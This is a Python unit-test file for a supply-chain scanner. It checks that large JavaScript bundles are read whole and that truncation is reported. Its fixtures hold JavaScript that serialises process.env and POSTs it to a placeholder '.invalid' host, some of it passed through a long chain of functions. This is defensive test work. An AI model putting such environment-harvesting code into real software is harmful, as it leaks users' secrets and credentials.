"""BIG-BUNDLE-TAIL (0.1.9): no part of a big text goes unread without the scan saying so. A big benign bundle is read
whole (the supply-chain tree's) and is OK, with nothing unread. The text follower, which answers where the tree cannot
(a text the parser refuses), reads a text whole, and when one of its limits stops it before the text's end (a text
made of little else: a chain longer than its 256 passes) the file is SC-TRUNCATED, in the limit's words, beside what
was found. The review's tail (REVIEW-FP-GITHUB-SCRIPT.md: an assignment past the follower's first 5,000 was not read,
quietly) is found. A file past the scan's largest (LAZARET_MAX_SOURCE_BYTES) is SC-TRUNCATED, as it was.

Payloads are inert: nothing is installed or run; the addresses are `.invalid`.
"""
import unittest
from unittest import mock

from lazaret.registry import repo
from lazaret.scanner import core
from tests.registry import _bundle_support as bb

PAD = "\n" + "void 0;\n" * 250001
SEND = "const payload=JSON.stringify(process.env);\nfetch('https://c.invalid/x',{method:'POST',body:payload});\n"
REFUSED = "\nfunction refused( {\n"     # code the parser refuses: the text follower answers


def tail_case(n):
    return "".join("const z%d=0;\n" % k for k in range(n)) + SEND


def backward_chain(n):
    # n functions, each giving its parameter to the one before it in the text: a pass of the follower's follows the
    # data one function on
    out = "function g%d(v) { fetch('https://c.invalid/x', { method: 'POST', body: v }); }\n" % (n - 1)
    out += "".join("function g%d(v) { g%d(v); }\n" % (k, k + 1) for k in range(n - 2, -1, -1))
    return out + "g0(JSON.stringify(process.env));\n"


class LimitsTests(unittest.TestCase):
    def test_a_big_benign_bundle_is_read_whole(self):
        verdict, issues = bb.action_issues(bb.bundle())
        self.assertEqual((verdict, issues), ("OK", []))

    def test_a_limit_the_follower_meets_is_said(self):
        text = SEND + backward_chain(300) + REFUSED
        self.assertIsNotNone(core.js_refusal(text))
        verdict, issues = bb.action_issues(text)
        self.assertEqual(verdict, "SUSPICIOUS")
        self.assertEqual(sorted((r, s) for r, s, _ in issues),
                         [("SC-IMPORT-RISK", "CRITICAL"), ("SC-TRUNCATED", "CRITICAL")])
        cut = [m for r, _, m in issues if r == "SC-TRUNCATED"][0]
        self.assertIn("the text follower reads at most 256 passes over the names, and this text's still had more to "
                      "give", cut)

    def test_the_reviews_tail(self):
        for n in (0, 4998, 4999, 5000, 5001, 6000):
            with self.subTest(n=n):
                reasons, line = core.import_time_risk(tail_case(n) + PAD, "js")
                self.assertEqual((reasons, line), ([bb.HARVEST], n + 2))
        for n in (4999, 5000):
            with self.subTest(n=n, route="action"):
                self.assertEqual(bb.action_issues(tail_case(n) + PAD)[1],
                                 [("SC-IMPORT-RISK", "CRITICAL", "dist/index.js runs when the action runs (runs.main), "
                                   "and it " + bb.HARVEST + ".")])

    def test_past_the_largest_file_read(self):
        with mock.patch.object(repo, "MAX_MEMBER", 2_500_000):
            verdict, issues = bb.action_issues(bb.bundle(2_600_000, code=SEND, at=1.0))
        self.assertEqual(verdict, "INCOMPLETE")
        self.assertEqual([r for r, _, _ in issues], ["SC-TRUNCATED"])


if __name__ == "__main__":
    unittest.main()
